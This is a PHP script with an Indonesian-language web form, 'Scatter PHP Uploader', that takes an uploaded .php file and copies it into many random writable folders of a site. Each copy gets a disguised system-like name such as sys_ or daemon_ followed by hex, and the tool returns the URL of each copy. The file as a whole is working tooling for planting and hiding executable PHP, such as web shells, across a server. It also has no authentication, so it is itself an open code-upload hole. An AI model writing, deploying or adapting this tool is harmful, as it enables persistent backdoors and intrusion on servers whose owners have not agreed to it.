<?php
// scatter_upload.php - Upload a .php file and copy it randomly into many folders with randomized system-like filenames, outputting URL list.
// Quick start: php -S 0.0.0.0:8000 -t .  and open http://localhost:8000/scatter_upload.php

ini_set('display_errors', '1');
error_reporting(E_ALL);

function h(string $s): string { return htmlspecialchars($s, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8'); }

function listDirectories(string $root, bool $leafOnly): array {
    $rootReal = realpath($root);
    if ($rootReal === false || !is_dir($rootReal)) {
        throw new RuntimeException('Root directory invalid.');
    }

    $dirs = [];
    $hasSubdirs = [];

    $iter = new RecursiveIteratorIterator(
        new RecursiveDirectoryIterator($rootReal, FilesystemIterator::SKIP_DOTS),
        RecursiveIteratorIterator::SELF_FIRST
    );

    foreach ($iter as $path => $info) {
        if ($info->isDir()) {
            $dirs[$path] = true;
            $parent = dirname($path);
            if ($parent && $parent !== $path) {
                $hasSubdirs[$parent] = true;
            }
        }
    }

    if ($leafOnly) {
        $leaf = [];
        foreach (array_keys($dirs) as $d) {
            if (empty($hasSubdirs[$d])) {
                $leaf[] = $d;
            }
        }
        sort($leaf);
        return $leaf;
    }

    $all = array_keys($dirs);
    sort($all);
    return $all;
}

function ensureDirWritable(string $dir): bool {
    return is_dir($dir) && is_writable($dir);
}

function generateSystemLikePhpName(): string {
    // e.g., sys_18f3a2c9.php or system_d3b7f5a1.php
    $prefixes = ['sys', 'system', 'svc', 'daemon', 'service'];
    $prefix = $prefixes[random_int(0, count($prefixes) - 1)];
    $token = bin2hex(random_bytes(4)); // 8 hex chars
    return $prefix . '_' . $token . '.php';
}

function buildUrl(string $baseUrl, string $root, string $targetPath): string {
    // Compute path relative to $root, then append to $baseUrl
    $rootReal = rtrim(str_replace('\\', '/', realpath($root)), '/');
    $targetReal = str_replace('\\', '/', $targetPath);
    $rel = ltrim(substr($targetReal, strlen($rootReal)), '/');
    $baseUrl = rtrim($baseUrl, '/');
    return $baseUrl . '/' . str_replace(' ', '%20', $rel);
}

function sanitizePath(string $path): string {
    return rtrim($path);
}

$defaults = [
    'root' => getcwd(),
    'baseUrl' => 'http://localhost:8000',
    'leafOnly' => true,
    'count' => 10,
];

$errors = [];
$result = null;
$method = $_SERVER['REQUEST_METHOD'] ?? 'GET';

if ($method === 'POST') {
    try {
        if (!isset($_FILES['upload']) || !is_uploaded_file($_FILES['upload']['tmp_name'])) {
            throw new RuntimeException('Tidak ada file yang diupload.');
        }

        $root = sanitizePath($_POST['root'] ?? $defaults['root']);
        $baseUrl = trim($_POST['baseUrl'] ?? $defaults['baseUrl']);
        $leafOnly = (($_POST['target'] ?? 'leaf') === 'leaf');
        $randomize = isset($_POST['randomize']);
        $count = (int)($_POST['count'] ?? $defaults['count']);
        if ($count < 1) $count = 1;

        $rootReal = realpath($root);
        if ($rootReal === false || !is_dir($rootReal)) {
            throw new RuntimeException('Root directory tidak ditemukan.');
        }

        // Validate only .php
        $origName = $_FILES['upload']['name'] ?? '';
        $ext = strtolower(pathinfo($origName, PATHINFO_EXTENSION));
        if ($ext !== 'php') {
            throw new RuntimeException('Hanya file .php yang diperbolehkan.');
        }

        $dirs = listDirectories($rootReal, $leafOnly);
        if (empty($dirs)) {
            throw new RuntimeException('Tidak ada folder target ditemukan.');
        }

        if ($randomize) {
            shuffle($dirs);
        }
        // Random pick $count unique directories
        if ($count > count($dirs)) {
            $count = count($dirs);
        }
        $selected = array_slice($dirs, 0, $count);

        $tmpPath = $_FILES['upload']['tmp_name'];
        $copied = [];
        $skipped = [];

        foreach ($selected as $dir) {
            if (!ensureDirWritable($dir)) {
                $skipped[] = ['dir' => $dir, 'reason' => 'Folder tidak writable'];
                continue;
            }
            // Ensure unique randomized name per folder
            $i = 0;
            do {
                $candidate = generateSystemLikePhpName();
                $targetPath = rtrim($dir, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . $candidate;
                $i++;
            } while (file_exists($targetPath) && $i < 10);

            if (@copy($tmpPath, $targetPath)) {
                $url = buildUrl($baseUrl, $rootReal, $targetPath);
                $copied[] = ['dir' => $dir, 'file' => basename($targetPath), 'path' => $targetPath, 'url' => $url];
            } else {
                $skipped[] = ['dir' => $dir, 'reason' => 'Gagal menyalin'];
            }
        }

        $result = [
            'root' => $rootReal,
            'baseUrl' => $baseUrl,
            'leafOnly' => $leafOnly,
            'randomize' => $randomize,
            'count' => $count,
            'copied' => $copied,
            'skipped' => $skipped,
        ];
    } catch (Throwable $e) {
        $errors[] = $e->getMessage();
        $result = ['errors' => $errors];
    }
}

?><!doctype html>
<html lang="id">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Scatter PHP Uploader</title>
  <style>
    body { font-family: system-ui, -apple-system, Segoe UI, Roboto, sans-serif; margin: 24px; line-height: 1.45; }
    .card { border: 1px solid #ddd; border-radius: 8px; padding: 16px; max-width: 980px; }
    .row { margin-bottom: 12px; }
    label { display: block; font-weight: 600; margin-bottom: 6px; }
    input[type=text], input[type=number] { width: 100%; padding: 8px; }
    input[type=file] { padding: 6px 0; }
    .grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(260px, 1fr)); gap: 12px; }
    .btn { background: #0d6efd; color: #fff; border: none; padding: 10px 14px; border-radius: 6px; cursor: pointer; }
    table { border-collapse: collapse; width: 100%; font-size: 13px; }
    th, td { border: 1px solid #ddd; padding: 6px 8px; text-align: left; }
    th { background: #fafafa; }
    code { background: #f6f8fa; padding: 2px 4px; border-radius: 4px; }
    details { margin-top: 10px; }
    summary { cursor: pointer; font-weight: 600; }
  </style>
</head>
<body>
  <div class="card">
    <h2>Upload & Tebar File PHP</h2>
    <form method="post" enctype="multipart/form-data">
      <div class="row">
        <label for="upload">File .php</label>
        <input type="file" id="upload" name="upload" accept=".php" required />
      </div>

      <div class="grid">
        <div>
          <label for="root">Root direktori (sesuai struktur file)</label>
          <input type="text" id="root" name="root" value="<?php echo h($defaults['root']); ?>" />
        </div>
        <div>
          <label for="baseUrl">Base URL (mengarah ke root di atas)</label>
          <input type="text" id="baseUrl" name="baseUrl" value="<?php echo h($defaults['baseUrl']); ?>" />
        </div>
      </div>

      <div class="row">
        <label>Target folder</label>
        <label><input type="radio" name="target" value="leaf" checked /> Hanya folder terdalam (leaf)</label>
        <label><input type="radio" name="target" value="all" /> Semua folder</label>
      </div>

      <div class="grid">
        <div>
          <label for="count">Jumlah folder acak</label>
          <input type="number" id="count" name="count" min="1" step="1" value="<?php echo (int)$defaults['count']; ?>" />
        </div>
        <div>
          <label>&nbsp;</label>
          <label><input type="checkbox" name="randomize" checked /> Acak urutan folder</label>
        </div>
      </div>

      <div class="row">
        <button class="btn" type="submit">Upload & Sebar</button>
      </div>
    </form>

    <?php if (!empty($errors)): ?>
      <div style="color:#b00020;margin-top:10px;">
        <?php foreach ($errors as $e): ?><div>• <?php echo h($e); ?></div><?php endforeach; ?>
      </div>
    <?php endif; ?>

    <?php if ($result && isset($result['root'])): ?>
      <hr />
      <h3>Hasil</h3>
      <div class="row">
        <div><strong>Root:</strong> <code><?php echo h($result['root']); ?></code></div>
        <div><strong>Base URL:</strong> <code><?php echo h($result['baseUrl']); ?></code></div>
        <div><strong>Target:</strong> <?php echo $result['leafOnly'] ? 'Leaf-only' : 'All directories'; ?></div>
        <div><strong>Acak:</strong> <?php echo $result['randomize'] ? 'Ya' : 'Tidak'; ?></div>
        <div><strong>Jumlah:</strong> <?php echo (int)$result['count']; ?></div>
      </div>

      <?php if (!empty($result['copied'])): ?>
        <details open>
          <summary>Berhasil (<?php echo count($result['copied']); ?>)</summary>
          <table>
            <thead><tr><th>#</th><th>Folder</th><th>Nama File</th><th>URL</th></tr></thead>
            <tbody>
              <?php foreach ($result['copied'] as $i => $row): ?>
                <tr>
                  <td><?php echo $i + 1; ?></td>
                  <td><code><?php echo h($row['dir']); ?></code></td>
                  <td><code><?php echo h($row['file']); ?></code></td>
                  <td><a href="<?php echo h($row['url']); ?>" target="_blank"><?php echo h($row['url']); ?></a></td>
                </tr>
              <?php endforeach; ?>
            </tbody>
          </table>
        </details>
      <?php endif; ?>

      <?php if (!empty($result['skipped'])): ?>
        <details>
          <summary>Terlewat/Skip (<?php echo count($result['skipped']); ?>)</summary>
          <table>
            <thead><tr><th>#</th><th>Folder</th><th>Alasan</th></tr></thead>
            <tbody>
              <?php foreach ($result['skipped'] as $i => $row): ?>
                <tr>
                  <td><?php echo $i + 1; ?></td>
                  <td><code><?php echo h($row['dir']); ?></code></td>
                  <td><?php echo h($row['reason']); ?></td>
                </tr>
              <?php endforeach; ?>
            </tbody>
          </table>
        </details>
      <?php endif; ?>
    <?php endif; ?>
  </div>

  <details style="margin-top:16px;">
    <summary>Cara jalanin cepat (CLI)</summary>
    <pre>php -S 0.0.0.0:8000 -t <?php echo h(getcwd()); ?></pre>
    <div>Buka di browser: <code>http://localhost:8000/scatter_upload.php</code></div>
  </details>
</body>
</html>
